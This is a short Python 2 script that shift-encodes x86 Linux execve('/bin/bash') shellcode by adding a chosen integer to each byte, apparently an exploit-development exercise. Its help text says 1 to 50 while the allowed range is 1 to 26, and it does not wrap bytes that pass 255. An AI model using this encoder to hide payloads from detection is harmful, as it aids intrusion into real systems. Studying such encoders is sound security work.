#!/usr/bin/python

# Pyon shift bytes encoder 
import random
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--encode", help="Please provide an interger between 1 and 50 for the encoder", type=int, required=True, choices=xrange(1,27))
args = parser.parse_args()

encoder = args.encode

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
#	original += '\\x'
#	original += '%02x' % x

	x += encoder

	encoded += '\\x'
	encoded += '%02x' % x


	encoded2 += '0x'
	encoded2 += '%02x,' %x




print "The original shellcode is:"
print ''.join("\\x{:02x}".format(x) for x in bytearray(shellcode))
print "\n"


print "Encoded shellcode in \\x format:"
print encoded
print "\n"


print "Encoded shellcode in 0x format:"
print encoded2
print "\n"

print 'Length of shellcode: %d' % len(bytearray(shellcode))
